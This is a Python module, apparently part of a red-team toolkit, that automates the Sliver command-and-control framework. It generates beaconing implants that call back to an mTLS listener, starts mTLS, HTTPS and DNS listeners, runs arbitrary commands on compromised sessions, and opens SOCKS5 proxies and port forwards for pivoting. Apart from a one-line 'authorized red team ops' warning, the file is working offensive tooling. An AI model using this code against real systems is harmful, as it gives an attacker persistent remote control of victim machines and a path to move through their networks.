"""C2 automation - Sliver gRPC/Python SDK automation."""
import os
import subprocess
import shutil
import time
from core.base_module import BaseModule
from core.logger import get_logger

LOG = get_logger("ceh.c2")


class SliverClient:
    """Wrapper quanh Sliver client CLI + gRPC."""

    def __init__(self, sliver_bin="sliver-client", config_dir=None):
        self.bin = shutil.which(sliver_bin) or sliver_bin
        self.config_dir = config_dir or os.path.expanduser("~/.sliver-client")
        self.available = shutil.which(sliver_bin) is not None

    def _run(self, args, timeout=60):
        if not self.available:
            return {"error": "sliver-client chưa cài"}
        cmd = [self.bin] + args
        LOG.info(f"[c2] sliver {' '.join(args[:3])}...")
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout)
            return {"stdout": r.stdout[-2000:],
                    "stderr": r.stderr[-500:],
                    "returncode": r.returncode}
        except subprocess.TimeoutExpired:
            return {"error": "Timeout"}
        except Exception as e:
            return {"error": str(e)}

    # ---------- Implant generation ----------
    def generate_implant(self, name="ceh-implant", os_target="linux",
                         arch="amd64", format="elf",
                         c2_url="mtls://127.0.0.1:8888",
                         beacon=False, seconds=60, jitter=0.3,
                         save="/tmp/implant"):
        args = ["generate"]
        if beacon:
            args.append("beacon")
        args += ["--name", name, "--os", os_target, "--arch", arch,
                 "--format", format, "--mtls", c2_url,
                 "--save", save]
        if beacon:
            args += ["--seconds", str(seconds), "--jitter", str(jitter)]
        return self._run(args, timeout=120)

    # ---------- Listeners ----------
    def start_listener(self, protocol="mtls", lhost="0.0.0.0",
                       lport=8888, domains=None):
        if protocol == "mtls":
            return self._run(["mtls", "--lhost", lhost,
                              "--lport", str(lport)], timeout=10)
        if protocol == "https":
            return self._run(["https", "--lhost", lhost,
                              "--lport", str(lport)], timeout=10)
        if protocol == "dns":
            d = domains[0] if domains else "c2.example.com"
            return self._run(["dns", "--domains", d], timeout=10)
        return {"error": f"Protocol không hỗ trợ: {protocol}"}

    # ---------- Sessions ----------
    def list_sessions(self):
        return self._run(["sessions"], timeout=30)

    def list_beacons(self):
        return self._run(["beacons"], timeout=30)

    def execute_on_session(self, session_id, command,
                           timeout=120):
        """Chạy command trên session (interactive-ish)."""
        # Sliver CLI hỗ trợ -c để non-interactive
        return self._run(["-c", f"use {session_id}; {command}"],
                         timeout=timeout)

    def socks5_proxy(self, session_id, port=1080):
        return self._run(["-c", f"use {session_id}; socks5 start "
                                 f"--host 127.0.0.1 --port {port}"],
                         timeout=10)

    def port_forward(self, session_id, remote_host, remote_port,
                     local_port):
        return self._run(
            ["-c", f"use {session_id}; portfwd add "
                   f"--remote {remote_host}:{remote_port} "
                   f"--bind 127.0.0.1:{local_port}"],
            timeout=10)


class SliverGRPCClient:
    """Client gRPC trực tiếp (nếu có sliver-py)."""

    def __init__(self, host="localhost", port=31337, config=None):
        try:
            import grpc
            from sliverpb import client_pb2_grpc
            self.grpc = grpc
            self.stub_cls = client_pb2_grpc.SliverRPCStub
            self.channel = grpc.insecure_channel(f"{host}:{port}")
            self.stub = self.stub_cls(self.channel)
            self.available = True
        except ImportError:
            self.available = False

    def version(self):
        if not self.available:
            return {"error": "sliver-py chưa cài (pip install sliver-py)"}
        try:
            from clientpb import client_pb2
            return self.stub.GetVersion(client_pb2.VersionReq())
        except Exception as e:
            return {"error": str(e)}


class Module(BaseModule):
    name = "c2_automation"
    module_id = "C2"
    description = "C2 automation (Sliver implant + listener + sessions)"

    def run(self):
        self.logger.info("[C2] Sliver C2 automation")
        self.logger.warning("[C2] Chỉ dùng cho authorized red team ops!")
        cfg = self.config
        client = SliverClient()
        results = {}

        if cfg.get("start_listener"):
            results["listener"] = client.start_listener(
                cfg["start_listener"].get("protocol", "mtls"),
                cfg["start_listener"].get("lhost", "0.0.0.0"),
                cfg["start_listener"].get("lport", 8888),
                cfg["start_listener"].get("domains"))

        if cfg.get("generate"):
            g = cfg["generate"]
            results["implant"] = client.generate_implant(
                name=g.get("name", "ceh-implant"),
                os_target=g.get("os", "linux"),
                arch=g.get("arch", "amd64"),
                format=g.get("format", "elf"),
                c2_url=g.get("c2_url", "mtls://127.0.0.1:8888"),
                beacon=g.get("beacon", False),
                seconds=g.get("seconds", 60),
                jitter=g.get("jitter", 0.3),
                save=g.get("save", "/tmp/implant"))

        if cfg.get("list_sessions"):
            results["sessions"] = client.list_sessions()
        if cfg.get("list_beacons"):
            results["beacons"] = client.list_beacons()

        # Execute commands trên sessions
        for cmd in cfg.get("execute", []):
            results[f"exec_{cmd['session_id'][:8]}"] = \
                client.execute_on_session(
                    cmd["session_id"], cmd["command"])

        # SOCKS5 proxy
        if cfg.get("socks5"):
            results["socks5"] = client.socks5_proxy(
                cfg["socks5"]["session_id"],
                cfg["socks5"].get("port", 1080))

        return results